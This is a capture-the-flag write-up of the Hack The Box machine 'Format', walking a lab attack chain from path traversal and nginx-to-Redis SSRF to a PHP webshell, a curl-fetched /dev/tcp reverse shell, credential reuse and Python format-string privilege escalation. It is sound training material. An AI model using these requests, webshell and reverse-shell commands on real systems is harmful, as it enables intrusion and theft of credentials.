---
layout: post
title: "HTB: Format"
subtitle: "path-traversal config leak, nginx-to-Redis SSRF over a unix socket, webshell write, Python format-string privesc"
date: 2023-05-15
tags: [htb, linux, lfi, ssrf, privesc, format-string]
category: writeups
kind: machine
tldr: "Gitea on 3000 handed me the full source. An admin edit handler had a path traversal that leaked the nginx config, exposing a regex proxy_pass that forwards to a Redis unix socket. I abused that SSRF to HSET a pro flag, then wrote a PHP webshell through the same traversal into a directory where PHP executes. Redis held cooper's reused password for SSH. A sudo license tool format-strings an attacker-controlled Redis field, leaking the root secret through __globals__."
---

## the box

Format is a medium Linux box running a small PHP microblogging app, `microblog.htb`, behind nginx 1.18.0. The app supports per-user blog subdomains, a "pro" tier, and stores its state in Redis over a unix socket. A Gitea instance on port `3000` exposes the whole codebase, which turns the box into a whitebox exercise: every bug is readable in the source before you fire it. The chain is path traversal to arbitrary read/write, an nginx `proxy_pass` misconfiguration that lets the web server speak to the Redis socket, a webshell, credential reuse out of Redis, and a Python `str.format()` injection for root.

## recon

```bash
nmap -p- --min-rate 10000 10.129.30.163
nmap -p22,80,3000 -sCV 10.129.30.163
```

Three ports.

```
22/tcp   open  ssh   OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http  nginx 1.18.0
|_http-title: Site doesn't have a title (text/html).
3000/tcp open  http  nginx 1.18.0
|_http-title: Did not follow redirect to http://microblog.htb:3000/
```

OpenSSH 8.4p1 is Debian 11. Port 3000 redirects to `microblog.htb:3000`, so I put the host in `/etc/hosts` and started enumerating subdomains. The app lives on the `app.` and `admin.` vhosts:

```bash
echo '10.129.30.163 microblog.htb app.microblog.htb admin.microblog.htb' | sudo tee -a /etc/hosts
```

Port 3000 is Gitea, and it serves `cooper/microblog` publicly, which is the complete application source. That is the gift of the box: I can read the vulnerable code instead of guessing at it. The repo has the live app, a blog template (`microblog-template`) whose `fetchPage()` reads a list of content files out of `order.txt` and `file_get_contents()`s each one into the page, and a `pro-files` folder gated behind the pro tier.

Registering at `app.microblog.htb/register` and logging in gives a dashboard where you create your own blog subdomain and edit posts. The edit interface posts to `/edit/index.php` on the `admin.` vhost.

## foothold

Reading the edit handler in the Gitea source showed the bug immediately. The `id` parameter is dropped into a file operation with no sanitization:

```php
$contents = str_replace($_POST['id'] . "\n", '', $contents);
file_put_contents("order.txt", $contents);
```

`id` is concatenated and written, and because the template later `file_get_contents()`s whatever paths are listed, a traversal in `id` becomes both an arbitrary write target and, by way of `order.txt` being read back and rendered, an arbitrary file read. Registering and then editing posts on the admin vhost works without extra privilege, the access control there is broken.

I tested read first by pointing `id` at `/etc/passwd`:

```
POST /edit/index.php HTTP/1.1
Host: admin.microblog.htb
Content-Type: application/x-www-form-urlencoded
Cookie: username=ts96atmih3et8dlllppagmeeiu

id=/etc/passwd&txt=zedzedez
```

The response embedded `/etc/passwd` inside the page's content div:

```
root:x:0:0:root:/root:/bin/bash
...
cooper:x:1000:1000::/home/cooper:/bin/bash
redis:x:103:33::/var/lib/redis:/usr/sbin/nologin
git:x:104:111:Git Version Control,,,:/home/git:/bin/bash
```

So `cooper` and `git` are the human-ish accounts, and `redis` runs as its own user. Arbitrary read confirmed. Next I read the nginx config the same way (`id=/etc/nginx/sites-available/default`), and that is where the interesting misconfiguration lives:

```
server {
    listen 80;
    root /var/www/microblog/app;
    server_name microblog.htb;

    location / { return 404; }

    location = /static/css/health/ {
        resolver 127.0.0.1;
        proxy_pass http://css.microbucket.htb/health.txt;
    }
    location = /static/js/health/ {
        resolver 127.0.0.1;
        proxy_pass http://js.microbucket.htb/health.txt;
    }
    location ~ /static/(.*)/(.*) {
        resolver 127.0.0.1;
        proxy_pass http://$1.microbucket.htb/$2;
    }
}
```

The last block is the problem. The regex captures two path segments and feeds `$1` straight into the `proxy_pass` host. nginx will accept a `unix:` target in a `proxy_pass`, so if I set `$1` to a `unix:/path/to.sock:` form I make nginx open the Redis unix socket and write whatever follows as the request. This is SSRF that lands on Redis.

The app reads its per-user state out of Redis. From the source, `isPro()` does an `HGET` of the `pro` field for the logged-in username:

```php
function isPro() {
    if(isset($_SESSION['username'])) {
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $pro = $redis->HGET($_SESSION['username'], "pro");
        return strval($pro);
    }
    return "false";
}
```

So if I `HSET <user> pro true` against the socket, that account becomes pro. I built the SSRF request to do exactly that. The detail that makes it work is sending the request with an HTTP method of `HSET`: nginx forwards the raw method verb to the upstream, and against the Redis socket an invalid HTTP verb is parsed as a Redis command. The trailing `a/b` satisfies the `(.*)/(.*)` regex's two captures.

```bash
# keep an account registered
curl http://app.microblog.htb/register/index.php -d 'first-name=test&last-name=test&username=test&password=test'

# HSET test pro true, routed through the proxy onto the redis socket
curl -X "HSET" 'http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:test%20pro%20true%20a/b'
```

`%2f` is the URL-encoded `/` in the socket path, `%20` the spaces between the Redis command arguments. With `pro` flipped to `true`, the account unlocks the pro features, which include a writable `uploads` directory. The key fact about the layout: PHP placed in `/uploads` executes, while `/content` is served as a plain download. So the webshell has to go in `/uploads`.

I reused the `id` traversal to write the shell, putting the PHP in the `header` field that gets written to the target file:

```
POST /edit/index.php HTTP/1.1
Host: admin.microblog.htb
Content-Type: application/x-www-form-urlencoded
Cookie: username=ts96atmih3et8dlllppagmeeiu

id=../uploads/shell.php&header=<URL-encoded PHP below>
```

The PHP I wrote was a small command form:

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd'])) {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```

Then commands ran through it:

```
http://admin.microblog.htb/uploads/shell.php?cmd=whoami
```

To upgrade to a proper shell I served a reverse-shell script and ran it through the webshell:

```bash
# attacker
echo 'sh -i >& /dev/tcp/10.10.16.60/1337 0>&1' > rev.sh
python3 -m http.server 8888
# via ?cmd=
curl http://10.10.16.60:8888/rev.sh -o /tmp/rev.sh
bash /tmp/rev.sh
```

That dropped me on the box as `www-data`.

## user

With a shell I talked to Redis directly over its socket instead of through nginx. The default TCP port refused me; the socket is the way in. `KEYS *` listed the stored users:

```bash
redis-cli -s /var/run/redis/redis.sock KEYS '*'
```

```
1) "test"
2) "cooper.dooper"
3) "PHPREDIS_SESSION:ts96atmih3et8dlllppagmeeiu"
4) "cooper.dooper:sites"
5) "test:sites"
```

`cooper.dooper` is the real user's profile hash. `HGETALL` dumped it:

```bash
redis-cli -s /var/run/redis/redis.sock hgetall "cooper.dooper"
```

```
1) "username"   2) "cooper.dooper"
3) "password"   4) "zooperdoopercooper"
5) "first-name" 6) "Cooper"
7) "last-name"  8) "Dooper"
9) "pro"        10) "false"
```

The app stores the password in cleartext in Redis, and cooper reused it for the system account. SSH straight in:

```bash
ssh cooper@microblog.htb
# password: zooperdoopercooper
```

cooper held the user flag.

## root

```
User cooper may run the following commands on format:
    (root) /usr/bin/license
```

`/usr/bin/license` is a Python script (a "license key manager"). Reading it, the bug is a `str.format()` call on data I control. The relevant logic pulls the username and name out of the same Redis profile and formats them into a key:

```python
prefix = "microblog"
username = r.hget(args.provision, "username").decode()
firstlast = r.hget(args.provision, "first-name").decode() + r.hget(args.provision, "last-name").decode()
license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
```

The intent is for `{license.license}` to be replaced by the random license string on the `License` object `l`. The problem is that `username`, `first-name`, and `last-name` all come from Redis, which I can write through the socket as cooper. Any `{...}` I put in those fields is also evaluated by `.format()`. That is a Python format-string injection. From a format string you can walk attributes, and `{license.__init__.__globals__[...]}` reaches the module globals of the script. The script reads its secret at the top:

```python
secret = [line.strip() for line in open("/root/license/secret")][0]
```

So `secret` is a module global, and `{license.__init__.__globals__[secret]}` leaks it into the printed license key. I confirmed the walk first by leaking the `License` object itself, then the `l` instance, before going for `secret`:

{% raw %}
```bash
redis-cli -s /var/run/redis/redis.sock
hset jack username {license.__init__.__globals__[secret]}
exit
sudo -u root /usr/bin/license -p jack
```
{% endraw %}

The plaintext key it printed had the secret inlined between the prefix and the trailing name fields:

```
Plaintext license key:
------------------------------------------------------
microblogunCR4ckaBL3Pa$$w0rd...jackjack
```

`unCR4ckaBL3Pa$$w0rd` is the secret, and it doubles as the root password:

```bash
su
# password: unCR4ckaBL3Pa$$w0rd
cat /root/root.txt
```

root.

## takeaway

A regex-driven `proxy_pass` let nginx reach a Redis unix socket, turning a path-traversal-leaked config into a data-write SSRF, and a `str.format()` call on attacker-controlled Redis fields walked `__globals__` to leak a root secret. Two recurring lessons: never `proxy_pass` a captured request segment into a host without strict validation, and never run `.format()` on untrusted input. The box also had a couple of unintended paths around release (a race during site creation that briefly left the blog root writable, and an nginx path-split trick to execute PHP from `/content`), both later patched, but the source-driven intended chain above is the clean one.
